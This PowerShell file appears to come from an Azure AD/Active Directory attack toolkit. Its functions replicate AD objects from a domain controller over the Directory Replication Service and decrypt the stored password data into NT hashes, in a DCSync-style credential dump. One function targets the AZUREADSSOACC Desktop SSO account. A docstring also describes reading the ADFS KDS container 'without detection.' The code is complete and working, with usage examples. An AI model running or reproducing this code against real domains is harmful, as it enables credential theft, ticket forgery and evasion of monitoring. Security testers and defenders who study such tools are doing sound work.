# This script contains functions for Active Directory Replication Service (DRS)

# Mar 22nd 2021
function Get-DesktopSSOAccountPassword
{
<#
    .SYNOPSIS
    Gets NTHash of Desktop SSO account

    .DESCRIPTION
    Gets NTHash of Desktop SSO account using Directory Replication Service (DRS).

    .PARAMETER AccountName
    The name of the Desktop SSO computer account. Defaults to AZUREADSSOACC

    .PARAMETER Credentials
    Credentials used to connect to Domain Controller. Must have Directory Replication permissions.

    .PARAMETER Server
    Name or ip address of the Domain Contoller. 

    .PARAMETER AsHex
    If defined, returns the NTHash as hex string.

    .Example
    $cred = Get-Credential
    PS C:\>$NTHash = Get-AADIntDesktopSSOAccountPassword -Credentials $cred -Server 192.168.0.10

    .Example
    $cred = Get-Credential
    PS C:\>Get-AADIntDesktopSSOAccountPassword -Credentials $cred -Server dc01 -AsHex

    ed31d88da3fc9aaa850ead2161faa815
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Server,
        [Parameter(Mandatory=$true)]
        [pscredential]$Credentials,
        [Parameter(Mandatory=$false)]
        [String]$AccountName="AZUREADSSOACC",
        [Parameter(Mandatory=$false)]
        [Switch]$AsHex
    )
    
    Process
    {
        # Get the object guid for the given account name
        $dirEntry =        [System.DirectoryServices.DirectoryEntry]::new("LDAP://$Server",$Credentials.UserName, $Credentials.GetNetworkCredential().Password)
        $ADSearch =        [System.DirectoryServices.DirectorySearcher]::new($dirEntry)
        $ADSearch.Filter = "(name=$AccountName)"
        $aduser =          $ADSearch.FindOne()
        $ObjectGuid =      $aduser.Properties["ObjectGuid"][0] 

        if($AsHex)
        {
            return Get-ADUserNTHash -Server $Server -Credentials $Credentials -ObjectGuid $ObjectGuid -AsHex
        }
        else 
        {
            return Get-ADUserNTHash -Server $Server -Credentials $Credentials -ObjectGuid $ObjectGuid 
        }

        
    }
}

# Mar 21st 2021
function Get-ADUserNTHash
{
<#
    .SYNOPSIS
    Gets NTHash of the given object

    .DESCRIPTION
    Gets NTHash for the given object ID using Directory Replication Service (DRS).

    .PARAMETER ObjectGuid
    Guid of the AD object

    .PARAMETER Credentials
    Credentials used to connect to Domain Controller. Must have Directory Replication permissions.

    .PARAMETER Server
    Name or ip address of the Domain Contoller. 

    .PARAMETER AsHex
    If defined, returns the NTHash as hex string.

    .Example
    $cred = Get-Credential
    PS C:\>$NTHash = Get-AADIntAdUserNTHash -ObjectGuid 36f71b0f-9963-48e9-8efa-9441f54ed1a4 -Credentials $cred -Server 192.168.0.10

    .Example
    $cred = Get-Credential
    PS C:\>Get-AADIntAdUserNTHash -ObjectGuid 36f71b0f-9963-48e9-8efa-9441f54ed1a4 -Credentials $cred -Server dc01 -AsHex

    ed31d88da3fc9aaa850ead2161faa815
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Server,
        [Parameter(Mandatory=$true)]
        [pscredential]$Credentials,
        [Parameter(ParameterSetName='Guid',Mandatory=$true)]
        [Guid]$ObjectGuid=[guid]::Empty,
        [Parameter(ParameterSetName='DN',Mandatory=$true)]
        [String]$DistinguishedName,
        [Parameter(Mandatory=$false)]
        [Switch]$AsHex
    )
    
    Process
    {
        $ADObject = Replicate-ADObject -Server $Server -Credentials $Credentials -ObjectGuid $ObjectGuid -DistinguishedName $DistinguishedName

        if($ADObject.NTHash)
        {
            if($AsHex)
            {
                return Convert-ByteArrayToHex -Bytes $ADObject.NTHash
            }
            else
            {
                return $ADObject.NTHash
            }
        }
    }
}

# Mar 21st 2021
function Get-ADUserThumbnailPhoto
{
<#
    .SYNOPSIS
    Gets thumbnailPhoto of the given object

    .DESCRIPTION
    Gets thumbnailPhoto for the given object ID using Directory Replication Service (DRS). 
    Can be used to access ADFS KDS container without detection.

    .PARAMETER ObjectGuid
    Guid of the AD object

    .PARAMETER Credentials
    Credentials used to connect to Domain Controller. Must have Directory Replication permissions.

    .PARAMETER Server
    Name or ip address of the Domain Contoller. 

    .PARAMETER AsHex
    If defined, returns the thumbnailPhoto as hex string.

    .Example
    $cred = Get-Credential
    PS C:\>$photo = Get-AADIntADUserThumbnailPhoto -ObjectGuid 36f71b0f-9963-48e9-8efa-9441f54ed1a4 -Credentials $cred -Server 192.168.0.10

    .Example
    $cred = Get-Credential
    PS C:\>Get-AADIntADUserThumbnailPhoto -ObjectGuid 36f71b0f-9963-48e9-8efa-9441f54ed1a4 -Credentials $cred -Server dc01 -AsHex

    ed31d88da3fc9aaa850ead2161faa815
#>
    [CmdletBinding()]

    
    param(
        [Parameter(Mandatory=$true)]
        [string]$Server,
        [Parameter(Mandatory=$true)]
        [pscredential]$Credentials,
        [Parameter(ParameterSetName='Guid',Mandatory=$true)]
        [Guid]$ObjectGuid=[guid]::Empty,
        [Parameter(ParameterSetName='DN',Mandatory=$true)]
        [String]$DistinguishedName,
        [Parameter(Mandatory=$false)]
        [Switch]$AsHex
    )
    
    Process
    {
        $ADObject = Replicate-ADObject -Server $Server -Credentials $Credentials -ObjectGuid $ObjectGuid -DistinguishedName $DistinguishedName

        if($AsHex)
        {
            return Convert-ByteArrayToHex -Bytes $ADObject.ThumbnailPhoto
        }
        else
        {
            return $ADObject.ThumbnailPhoto
        }
    }
}

# Mar 21st 2021
# Replicate a single AD object using DSInternals.Replication
function Replicate-ADObject
{
    [CmdletBinding()]

    param(
        [Parameter(Mandatory=$true)]
        [string]$Server,
        [Parameter(Mandatory=$true)]
        [pscredential]$Credentials,
        [Parameter(Mandatory=$false)]
        [Guid]$ObjectGuid,
        [Parameter(Mandatory=$false)]
        [String]$DistinguishedName
    )

    Begin
    {
        try
        {
            # Import DSInternals dlls
            Add-Type -Path "$PSScriptRoot\DSInternals\NDceRpc.Microsoft.dll"
            Add-Type -Path "$PSScriptRoot\DSInternals\DSInternals.Replication.Interop.dll"
            Add-Type -Path "$PSScriptRoot\DSInternals\DSInternals.Replication.dll"

            # Import native decrypt function
            $NativeDecryptSource=@"
[DllImport("advapi32.dll", EntryPoint = "SystemFunction027", SetLastError = true)]
public static extern uint RtlDecryptNtOwfPwdWithIndex([In] byte[] encryptedNtOwfPassword, [In] ref int index, [In, Out] byte[] ntOwfPassword);
"@
            $NativeDecrypt = Add-Type -memberDefinition $NativeDecryptSource -passthru -name NativeDecrypt -ErrorAction SilentlyContinue
            Remove-Variable NativeDecryptSource
        }
        catch
        {
            Throw "Could not load required DLLs: $_.Exception.Message"
        }
    }
    Process
    {
        # Connect to domain controller
        Write-Verbose "Connecting to $Server as $($Credentials.UserName)"
        $repClient = [DSInternals.Replication.DirectoryReplicationClient]::new($Server,[DSInternals.Replication.RpcProtocol]::TCP,$Credentials)
        $sessionKey = $repClient.SessionKey

        try
        {
            # Get the AD object
            if($ObjectGuid -ne [guid]::Empty)
            {
                Write-Verbose "Getting AD object for $($ObjectGuid.ToString())"
                $object = $repClient.GetReplicaObject($ObjectGuid)
            }
            else
            {
                Write-Verbose "Getting AD object for $DistinguishedName)"
                $object = $repClient.GetReplicaObject($DistinguishedName)
            }

            Write-Verbose "Found object: $($object.DistinguishedName)"

            # Get the attributes 
            # https://github.com/vletoux/ADSecrets/blob/master/AttdIDToAttribute

            if($object.Attributes[1441827]) # thumbnailPhoto
            {
                $thumbnailPhoto = $object.Attributes[1441827].Values[0] 
                Write-Verbose " thumbnailPhoto ($($thumbnailPhoto.Count) bytes)"
                $object | Add-Member -NotePropertyName "thumbnailPhoto" -NotePropertyValue $thumbnailPhoto
            }

            if($object.Attributes[589914]) # Decrypt the NT hash if present
            {
                $ntHash = $object.Attributes[ 589914].Values[0] # unicodePwd

                # First round decrypt with session key
                
                $salt =       $ntHash[ 0..15]
                $encSecret =  $ntHash[16..35]
                $md5 =        [System.Security.Cryptography.MD5]::Create()
                $md5.TransformBlock($sessionKey,0, $sessionKey.Count,$null,0)
                $md5.TransformFinalBlock($salt, 0, 16)
                $rc4Key =     $md5.Hash
                $encSecret =  (Get-RC4 -Key $rc4Key -Data $encSecret)

                # Second round decrypt with RID (Relative ID)
                $sid =        $object.Attributes[589970].Values[0] # objectSid
                $rid =        [BitConverter]::ToInt32($sid,$sid.Length - 4)
                $encSecret =  $encSecret[4..19] # Strip the CRC
                $decSecret =  [byte[]]::new(16)
                $NativeDecrypt::RtlDecryptNtOwfPwdWithIndex($encSecret, [ref]$rid, $decSecret)
            
                Write-Verbose " NTHash: $(Convert-ByteArrayToHex -Bytes $decSecret)"
                $object | Add-Member -NotePropertyName "NTHash" -NotePropertyValue $decSecret
            }
        }
        catch
        {
            if($_.Exception.Message.Contains("RPC"))
            {
                Throw "Could not connect to $Server as $($Credentials.UserName), check the server and credentials!"
            }
        }
        finally
        {
            $repClient.Dispose()
        }

        if(!$object)
        {
            if($ObjectGuid -ne [guid]::Empty)
            {
                Throw "No AD object found for $($ObjectGuid.ToString())"
            }
            else
            {
                Throw "No AD object found for $DistinguishedName"
            }
        }

        return $object
    }
}

